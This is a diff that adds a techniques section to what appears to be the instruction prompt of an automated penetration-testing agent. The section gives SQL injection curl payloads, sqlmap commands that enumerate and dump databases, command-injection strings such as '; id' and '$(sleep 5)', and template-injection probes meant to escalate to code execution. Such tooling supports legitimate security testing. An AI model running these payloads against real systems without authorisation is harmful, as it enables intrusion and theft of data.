@@ -53,6 +53,40 @@ extraction, command execution, or template evaluation with actual output. If a t
 "might be injectable" but you cannot extract data or execute commands, report it as
 UNCONFIRMED with the detection evidence and move on.
 
+## PRACTICAL TECHNIQUES
+
+### SQL Injection Discovery
+1. Find input parameters: search forms, login pages, API endpoints with query params, any URL with `?param=value`
+2. Manual probe first (fast, quiet):
+   - `curl 'http://target/api/search?q=test'"'"''` — single quote appended, watch for SQL errors in response
+   - `curl 'http://target/api/search?q=1 OR 1=1--'` — boolean-based test
+   - `curl 'http://target/api/search?q=1; WAITFOR DELAY '"'"'0:0:5'"'"'--'` — time-based blind (measure response time)
+   - `curl -X POST http://target/rest/user/login -H 'Content-Type: application/json' -d '{"email":"'"'"' OR 1=1--","password":"x"}'` — SQLi in JSON login body
+3. If manual probe shows signs of injection (SQL error messages, different behavior, time delay), THEN use sqlmap:
+   - `sqlmap -u 'http://target/api/search?q=test' --batch --level=3 --risk=2 --dbs` — enumerate databases
+   - `sqlmap -u 'http://target/api/search?q=test' --batch --technique=T --time-sec=5 --dbs` — for blind SQLi
+   - `sqlmap -u 'http://target/api/search?q=test' --batch --dbs --tables -D dbname` — dump table names
+4. For POST parameters: save the request to a file, use `sqlmap -r request.txt --batch`
+5. For JSON bodies: `sqlmap -u 'http://target/api/endpoint' --data='{"key":"value"}' --batch --level=3`
+6. Evidence = extracted data (database names, tables, actual records). "Might be injectable" is NOT evidence.
+
+### Command Injection
+1. Look for parameters that might execute system commands (ping, DNS lookup, file operations, traceroute)
+2. Test with time-based detection: `; sleep 5`, `| sleep 5`, `$(sleep 5)`, `` `sleep 5` ``
+3. Test with output-based detection: `; id`, `| id`, `$(id)`, `` `id` ``
+4. Use commix for automated testing: `commix -u 'http://target/api/ping?host=127.0.0.1' --batch`
+
+### Server-Side Template Injection (SSTI)
+1. Test with math expressions: `{` `{7*7}` `}` (Jinja2/Twig), `${7*7}` (Freemarker), `<%= 7*7 %>` (ERB/EJS)
+2. If 49 appears in the response, identify the template engine and escalate to code execution
+3. Use tplmap for automated testing: `tplmap -u 'http://target/page?name=test'`
+
+### TOOL FAILURE RULE
+- If sqlmap finds nothing after 2 minutes, move to the next parameter. Do not let it run forever.
+- Always set `--batch` flag to prevent interactive prompts hanging the container.
+- If a tool's flags are wrong, check `--help` first instead of guessing.
+- Maximum 2 minutes per parameter per tool. Move on if no results.
+
 ## OPERATIONAL ENVIRONMENT
 
 <container_constraints>
